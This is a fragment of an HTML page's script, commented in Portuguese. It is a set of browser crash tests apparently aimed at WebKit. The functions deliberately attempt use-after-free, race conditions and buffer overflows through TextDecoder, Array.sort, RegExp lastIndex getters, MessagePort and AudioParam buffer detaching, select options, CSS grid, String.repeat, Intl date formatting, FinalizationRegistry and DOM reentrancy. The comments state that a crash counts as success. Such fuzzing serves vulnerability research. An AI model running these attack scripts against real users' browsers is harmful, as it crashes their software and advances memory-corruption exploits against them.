                const decoder = new TextDecoder("utf-8", {fatal: true});
                
                // Sequ√™ncia inv√°lida (In√≠cio de 3 bytes, mas s√≥ tem 1)
                const badChunk = new Uint8Array([0xE2]); 
                
                // Enche o buffer interno com estado pendente
                log("Enchendo buffer de estado...");
                for(let i=0; i<1000; i++) {
                    try {
                        decoder.decode(badChunk, {stream: true});
                    } catch(e) {}
                }
                
                // O GOLPE: Envia um payload v√°lido gigante para for√ßar flush + realoca√ß√£o
                // enquanto o estado interno est√° "sujo".
                const bomb = new Uint8Array(1024 * 1024).fill(0x41); // 1MB
                
                log("For√ßando flush cr√≠tico...");
                const res = decoder.decode(bomb);
                
                log("Decoder sobreviveu. Output length: " + res.length);
                
            } catch(e) {
                // TypeError ou EncodingError s√£o normais.
                // Crash ou "Internal Error" s√£o sucessos.
                log("Erro Decoder: " + e.message);
            }
        }
function runSortSuicide() {
            log("Iniciando Sort Suicide...");
            
            try {
                // Array grande para garantir que o sort demore e use o Heap
                const arr = new Array(10000).fill(0).map((_, i) => i);
                
                arr.sort((a, b) => {
                    // Gatilho no meio da opera√ß√£o
                    if (a === 5000 || b === 5000) {
                        log("Gatilho! Zerando array...");
                        arr.length = 0; // Esvazia. Mem√≥ria libertada.
                        // NENHUM PUSH AQUI.
                        
                        // Tenta for√ßar GC para limpar os restos
                        try { new ArrayBuffer(10 * 1024 * 1024); } catch(e){}
                    }
                    return a - b;
                });
                
                log("Sort terminou.");
                log("Array length: " + arr.length);
                // Se o sort funcionou "corretamente" num array zerado, deve estar vazio.
                // Se houver elementos fantasmas (length > 0 mas vazios), √© corrup√ß√£o.
                if (arr.length > 0) {
                    log("ALERTA: Array Fantasma! Length n√£o √© 0.");
                }

            } catch(e) {
                log("Erro: " + e.message);
            }
        }

        // --- TESTE 2: RegExp Input Destruction ---
        // Tenta destruir a string de entrada enquanto a Regex a l√™.
        function runRegExpDestruction() {
            log("Iniciando RegExp String Destruction...");
            
            try {
                // String gigante para ocupar mem√≥ria
                let str = "A".repeat(100000);
                const re = /A/g;
                
                // Define um getter em lastIndex para rodar c√≥digo durante o 'exec'
                Object.defineProperty(re, 'lastIndex', {
                    get: () => { return 0; },
                    set: (v) => {
                        log("Engine definindo lastIndex. Destruindo string...");
                        // Remove a refer√™ncia √† string original
                        str = null;
                        // Aloca lixo para sobrescrever a mem√≥ria antiga
                        const junk = new Array(100000).fill(1.1);
                        return v;
                    }
                });

                log("Executando regex...");
                // Passamos a string. O motor guarda um ponteiro C++.
                // O nosso setter roda e tenta libertar esse ponteiro.
                re.exec(str);
                
                log("RegExp terminou (Seguro).");
                
            } catch(e) {
                log("Erro RegExp: " + e.message);
            }
        }

        // --- TESTE 3: MessagePort Transfer Race ---
        // Transfere uma porta para si mesma/worker e tenta us√°-la simultaneamente.
        function runPortRace() {
            log("Iniciando MessagePort Race...");
            
            try {
                const channel = new MessageChannel();
                const port = channel.port1;
                
                // Objeto que, ao ser serializado, transfere a porta
                const bomb = {
                    get payload() {
                        log("Serializando payload. Transferindo porta...");
                        // Transfere a porta para um novo worker (neutering)
                        const w = new Worker(URL.createObjectURL(new Blob([""], {type:"text/js"})));
                        w.postMessage("bye", [port]);
                        return "BOOM";
                    }
                };

                // Tenta enviar a bomba PELA pr√≥pria porta que vai ser transferida
                // postMessage primeiro serializa (roda o getter), depois envia.
                // Se a ordem interna falhar, ele tenta enviar numa porta fechada/nula.
                port.postMessage(bomb);
                
                log("PostMessage sobreviveu.");
                
            } catch(e) {
                // DataCloneError √© a defesa correta.
                // Crash ou erro de sistema √© o objetivo.
                log("Erro Port: " + e.message);
            }
        }

    function runPortRace_Aggressive() {
    log("üî• Iniciando MessagePort Race AGRESSIVA...");

    try {
        const channel = new MessageChannel();
        const port = channel.port1;

        // Criamos dois workers para disputar a mesma porta
        const w1 = new Worker(URL.createObjectURL(new Blob([""], {type:"text/js"})));
        const w2 = new Worker(URL.createObjectURL(new Blob([""], {type:"text/js"})));

        // A cada gatilho, vamos tentar transferir a porta m√∫ltiplas vezes
        function multiNeuterPort() {
            try {
                w1.postMessage("x", [port]);
            } catch (e) { log("w1 falhou: " + e.message); }

            try {
                w2.postMessage("x", [port]);
            } catch (e) { log("w2 falhou: " + e.message); }
        }

        // OBJETO BOMBA
        const bomb = {
            get payload() {
                log("üí£ Getter ativado: neutering m√∫ltiplo!");

                // Disputa simult√¢nea (condi√ß√£o de corrida)
                for (let i = 0; i < 5; i++) {
                    multiNeuterPort();
                }

                return "BOOM";
            },

            get explode() {
                // Getter secund√°rio para piorar o timing
                log("üí• Getter secund√°rio executado durante clone!");
                multiNeuterPort();
                return 1337;
            }
        };

        // Objeto que referencia a si mesmo (stress do structured clone)
        bomb.self = bomb;

        log("üì® Enviando bomba via porta!");
        port.postMessage(bomb);

        log("PostMessage retornou (sem crash).");

    } catch (e) {
        log("Erro capturado: " + e.message);
    }
}
function runAudioParamCrash() {
            log("Iniciando AudioParam Race...");
            
            try {
                const ctx = new (window.AudioContext || window.webkitAudioContext)();
                const osc = ctx.createOscillator();
                const gain = ctx.createGain();
                
                osc.connect(gain);
                gain.connect(ctx.destination);
                
                // Cria uma curva de automa√ß√£o gigante (Float32Array)
                const size = 1024 * 1024; // 1 Milh√£o de amostras (4MB)
                const curve = new Float32Array(size).fill(0.5);
                
                // Agenda a automa√ß√£o na thread de √°udio
                log("Agendando curva de automa√ß√£o...");
                gain.gain.setValueCurveAtTime(curve, ctx.currentTime, 10);
                osc.start();
                
                // O GOLPE: Rouba o buffer imediatamente
                // A thread de √°udio precisa ler 'curve' pelos pr√≥ximos 10 segundos
                log("Tentando neutrar buffer...");
                try {
                    const w = new Worker(URL.createObjectURL(new Blob([""], {type: "text/javascript"})));
                    // Transfere o buffer (detachment)
                    w.postMessage(curve.buffer, [curve.buffer]);
                    w.terminate();
                    
                    if (curve.length === 0) {
                        log("SUCESSO: Buffer neutrado! Se o √°udio continuar/crashar, √© UAF.");
                    }
                } catch(e) {
                    log("Falha no detach: " + e.message);
                }

            } catch(e) {
                log("Erro Audio: " + e.message);
            }
        }

        // --- TESTE 2: Select Options Length UAF ---
        // Manipula a destrui√ß√£o de op√ß√µes de um select.
        function runSelectUAF() {
            log("Iniciando Select Options Attack...");
            
            const s = document.createElement('select');
            document.body.appendChild(s);
            
            // Adiciona muitas op√ß√µes
            for(let i=0; i<1000; i++) {
                const o = document.createElement('option');
                o.text = "opt" + i;
                s.add(o);
            }
            
            log("Select preenchido. Truncando...");
            
            // Tenta acessar uma op√ß√£o enquanto elas est√£o sendo deletadas em massa
            // length = 0 dispara um loop C++ de destrui√ß√£o
            try {
                // Define um getter na propriedade '0' do HTMLOptionsCollection
                // (Conceitual, nem sempre poss√≠vel em DOM direto, mas tentamos via colis√£o)
                const opts = s.options;
                
                // O GOLPE: Zera o tamanho.
                // Imediatamente tenta ler a op√ß√£o 500 que deveria estar morta
                s.length = 0;
                
                const zombie = opts[500]; 
                if (zombie) {
                    log("ALERTA: Acesso a op√ß√£o morta poss√≠vel? " + zombie.text);
                } else {
                    log("Limpeza segura.");
                }
                
            } catch(e) {
                log("Erro Select: " + e.message);
            }
            
            document.body.removeChild(s);
        }

        // --- TESTE 3: CSS Grid Track Overflow ---
        // For√ßa a aloca√ß√£o de milh√µes de trilhas de grid.
        function runGridCrash() {
            log("Iniciando Grid Memory Smash...");
            const el = document.getElementById('grid-bomb');
            el.style.display = "grid";
            
            // Valor insano: 1 milh√£o de linhas
            // O WebKit aloca um vetor de estruturas para cada linha
            // sizeof(GridTrack) * 1000000
            const tracks = "repeat(1000000, 10px)";
            
            log("Aplicando estilo de Grid massivo...");
            
            try {
                el.style.gridTemplateRows = tracks;
                
                // For√ßa layout
                const h = el.scrollHeight;
                log("Layout calculado: " + h + "px");
                log("Grid Engine sobreviveu.");
                
            } catch(e) {
                log("Erro Grid: " + e.message);
            }
            
            el.style.display = "none";
        }
function runStringOverflow() {
            log("Iniciando String.repeat Overflow...");
            
            try {
                // 1. Tenta o limite de 32-bit (4GB)
                // Se o sistema usar 32-bit para comprimento, isso vira 0 ou negativo.
                // "A" (1 byte) * (2^32 - 1)
                // Se o alocador calcular errado, aloca pouco e escreve muito.
                
                // Valores cr√≠ticos:
                // 0xFFFFFFFF (Max Uint32)
                // 0x7FFFFFFF (Max Int32)
                // 0x20000000 (512MB - limite comum de string no V8/JSC antigo)
                
                const counts = [0x7FFFFFFF, 0xFFFFFFF0, 268435455]; 
                
                counts.forEach(c => {
                    try {
                        log(`Tentando repetir string ${c} vezes...`);
                        const s = "A".repeat(c);
                        log(`String criada (Seguro). Length: ${s.length}`);
                    } catch(e) {
                        // RangeError (Invalid string length) √© a prote√ß√£o.
                        // Se crashar, a prote√ß√£o falhou.
                        log("Erro (Browser Protegeu): " + e.message);
                    }
                });

                // Tentativa secund√°ria: Overflow com string base maior
                // "AAAA" (4 bytes) * 0x40000000 = 4GB
                const base = "AAAA";
                log("Tentando overflow com base maior...");
                const s2 = base.repeat(0x3FFFFFFF); 
                log("Seguro.");

            } catch(e) {
                log("Erro Fatal: " + e.message);
            }
        }

        // --- TESTE 2: Sparse Array Reverse ---
        // Arrays esparsos n√£o t√™m mem√≥ria alocada para os "buracos".
        // A fun√ß√£o reverse() precisa trocar √≠ndices extremos.
        // Se o c√°lculo de √≠ndices falhar em arrays gigantes, pode acessar mem√≥ria inv√°lida.
        function runSparseReverse() {
            log("Iniciando Sparse Array Reverse...");
            
            try {
                const arr = [];
                // Define √≠ndices nos extremos do limite de 32-bit
                arr[0] = 1;
                arr[0xFFFFFFFE] = 2; // 4GB - 2
                
                log(`Array esparso criado. Length: ${arr.length}`);
                log("Executando reverse()...");
                
                // O GOLPE: O motor tem de trocar o √≠ndice 0 com o 0xFFFFFFFE.
                // Se ele tentar iterar ou alocar mem√≥ria para os buracos, OOM.
                // Se ele calcular errado o endere√ßo do √∫ltimo item, Crash.
                arr.reverse();
                
                log("Reverse conclu√≠do.");
                log("Valor em [0]: " + arr[0]); // Deve ser 2
                
            } catch(e) {
                log("Erro Sparse: " + e.message);
            }
        }

        // --- TESTE 3: CSS Property Flood ---
        // Enche um elemento com milhares de vari√°veis CSS √∫nicas.
        // Tenta estourar a tabela de hash interna ou o buffer de estilo.
        function runCSSFlood() {
            log("Iniciando CSS Property Flood...");
            
            const el = document.getElementById('dummy');
            const style = el.style;
            
            try {
                // WebKit tem otimiza√ß√µes para "Inline Styles".
                // Vamos adicionar 50.000 propriedades √∫nicas.
                const count = 50000;
                
                for(let i=0; i<count; i++) {
                    // Usa setProperty para for√ßar o parser
                    style.setProperty(`--var-${i}`, `val${i}`);
                    
                    if (i % 5000 === 0) log(`Definidas ${i} propriedades...`);
                }
                
                log("Propriedades definidas. For√ßando acesso...");
                
                // Tenta ler uma propriedade para for√ßar a resolu√ß√£o do mapa
                const val = getComputedStyle(el).getPropertyValue(`--var-${count-1}`);
                log("Leitura: " + val);
                
                // O GOLPE: Tenta aplicar esse estilo massivo a outro elemento (Clone)
                // Isso for√ßa uma c√≥pia da estrutura interna gigante
                const clone = el.cloneNode(true);
                document.body.appendChild(clone);
                
                log("Clone e renderiza√ß√£o conclu√≠dos (Seguro).");
                document.body.removeChild(clone);
                
            } catch(e) {
                log("Erro CSS: " + e.message);
            }
        }
 function runLocaleCompareCrash() {
            log("Iniciando Locale Compare Stack Attack...");
            
            try {
                // Cria strings gigantes para for√ßar aloca√ß√£o na stack do C
                // 1MB de dados repetidos
                const strA = "A".repeat(1024 * 1024);
                const strB = "B".repeat(1024 * 1024);
                
                log(`Comparando strings de ${strA.length} bytes...`);
                
                // Usa um locale complexo para ativar l√≥gica de transforma√ß√£o pesada
                // 'co-phonebk' (lista telef√≥nica) exige ordena√ß√£o especial
                const result = strA.localeCompare(strB, "de-DE-u-co-phonebk", {
                    usage: "sort",
                    sensitivity: "variant"
                });
                
                log("Compara√ß√£o terminou (Seguro). Resultado: " + result);
                
            } catch(e) {
                // Se for RangeError, o JS protegeu.
                // Se o navegador fechar, a libc falhou.
                log("Erro: " + e.message);
            }
        }

        // --- TESTE 2: Date Format Buffer Overflow ---
        // Ataca 'strftime' / 'asctime_s'.
        // Gera uma data que resulta numa string maior que os buffers padr√£o de C (ex: 256 bytes).
        function runDateFormatCrash() {
            log("Iniciando Date Format Buffer Overflow...");
            
            try {
                // Data com ano gigante e timezone longo
                const d = new Date();
                d.setFullYear(200000); // Ano enorme
                
                log("Formatando data extrema...");
                
                // Pede formato completo para maximizar o tamanho da string
                const options = {
                    weekday: 'long', year: 'numeric', month: 'long', day: 'numeric',
                    hour: 'numeric', minute: 'numeric', second: 'numeric',
                    timeZoneName: 'long', era: 'long'
                };
                
                // Tenta for√ßar o uso de um locale que expande o texto (ex: Ar√°bico ou Chin√™s)
                const fmt = new Intl.DateTimeFormat("ar-SA", options);
                
                // O GOLPE: O C++ aloca um buffer (ex: 128 bytes).
                // A string resultante (com ano 200000 em ar√°bico e timezone) pode exceder isso.
                const res = fmt.format(d);
                
                log("Formata√ß√£o terminou (Seguro). Len: " + res.length);
                log("Output parcial: " + res.substring(0, 50) + "...");
                
            } catch(e) {
                log("Erro: " + e.message);
            }
        }

        // --- TESTE 3: RegExp Execution State Desync ---
        // Tenta corromper o estado interno do motor RegExp durante a execu√ß√£o.
        function runRegExpStateCrash() {
            log("Iniciando RegExp State Desync...");
            
            try {
                const re = /A/g;
                // String alvo
                let str = "A".repeat(10000);
                
                // Define um getter em lastIndex que roda a cada match
                Object.defineProperty(re, 'lastIndex', {
                    get: function() { return 0; },
                    set: function(v) {
                        // O GOLPE: O motor C++ est√° no meio do loop.
                        // N√≥s tentamos invalidar a string ou o pr√≥prio RegExp aqui.
                        log("Engine definindo lastIndex. Corrompendo estado...");
                        
                        // Tenta for√ßar GC agressivo para limpar a string original
                        str = null; 
                        const junk = new Array(10000).fill(1.1);
                        
                        return v;
                    }
                });

                log("Executando RegExp.exec...");
                // Se o motor C++ manteve um ponteiro para 'str' sem proteger contra GC,
                // ele vai ler mem√≥ria liberta na pr√≥xima itera√ß√£o.
                re.exec(str);
                
                log("RegExp terminou (Seguro).");
                
            } catch(e) {
                log("Erro: " + e.message);
            }
        }
function runGCResurrection() {
            log("Iniciando GC Resurrection Attack...");
            
            if (!window.FinalizationRegistry) {
                log("API FinalizationRegistry n√£o suportada.");
                return;
            }

            let registry = new FinalizationRegistry(heldValue => {
                // Este c√≥digo roda quando o objeto morre.
                // O GC est√° num estado sens√≠vel aqui.
                log("Objeto coletado! Tentando aloca√ß√£o massiva no callback...");
                
                // Tenta for√ßar movimento de mem√≥ria enquanto o GC limpa
                const chaos = [];
                try {
                    for(let i=0; i<1000; i++) chaos.push(new ArrayBuffer(1024 * 100));
                } catch(e) {}
                
                // Se o GC n√£o estiver bloqueado corretamente, isso pode corromper o heap.
            });

            // Cria objetos descart√°veis
            function makeTrash() {
                let obj = { id: Math.random() };
                registry.register(obj, "LIXO");
                obj = null; // Marca para coleta
            }

            // Gera lixo massivo para for√ßar o ciclo de GC
            log("Gerando press√£o de GC...");
            const interval = setInterval(() => {
                for(let i=0; i<1000; i++) makeTrash();
                
                // Tenta for√ßar aloca√ß√£o para disparar o GC
                const trigger = new Array(10000).fill(1.1);
            }, 10);

            setTimeout(() => {
                clearInterval(interval);
                log("Teste GC finalizado.");
            }, 5000);
        }

        // --- TESTE 2: Canvas Save() Stack Exhaustion ---
        // Tenta estourar a pilha de estados interna do Canvas (C++).
        function runCanvasStack() {
            log("Iniciando Canvas Stack Smash...");
            
            const ctx = document.getElementById('c').getContext('2d');
            let depth = 0;
            
            try {
                // Loop infinito de save()
                // Cada save aloca mem√≥ria para guardar o estado atual (matrix, style, clip)
                while (true) {
                    depth++;
                    ctx.fillStyle = "red";
                    ctx.shadowBlur = 10; // Adiciona complexidade ao estado
                    ctx.save();
                    
                    if (depth % 10000 === 0) log(`Stack depth: ${depth}`);
                    
                    if (depth > 500000) break; // Limite de seguran√ßa do script
                }
                log("Canvas Stack sobreviveu a " + depth + " n√≠veis.");
                
            } catch(e) {
                log("Erro Canvas (Limite atingido?): " + e.message);
            }
        }

        // --- TESTE 3: Node.replaceChild Reentrancy ---
        // Usa um getter ou proxy para reentrar no DOM durante uma substitui√ß√£o.
        function runReplaceReentrancy() {
            log("Armando replaceChild Reentrancy Trap...");
            
            const sandbox = document.getElementById('sandbox');
            sandbox.innerHTML = "<div>ALVO</div>";
            const parent = sandbox.firstChild;
            const oldChild = parent.firstChild;
            
            // Cria um novo n√≥ que dispara c√≥digo ao ser inserido?
            // Usamos um DocumentFragment com um script que roda imediatamente
            const newChild = document.createDocumentFragment();
            const s = document.createElement('script');
            s.textContent = `
                parent.log("Script injetado executando!");
                // O GOLPE: Remove o pai ('parent') do DOM agora mesmo
                const p = document.getElementById('sandbox').firstChild;
                if (p) p.parentNode.removeChild(p);
                // Tenta destruir o 'oldChild' tamb√©m
            `;
            newChild.appendChild(s);

            try {
                log("Executando parent.replaceChild()...");
                // O C++ remove oldChild, prepara newChild...
                // Ao inserir newChild, o script roda.
                // O script remove 'parent'.
                // O C++ tenta finalizar a opera√ß√£o no 'parent' morto?
                parent.replaceChild(newChild, oldChild);
                
                log("Opera√ß√£o DOM finalizada.");
                
            } catch(e) {
                log("Erro DOM: " + e.message);
            }
        }

   

    </script>
</body>
</html>
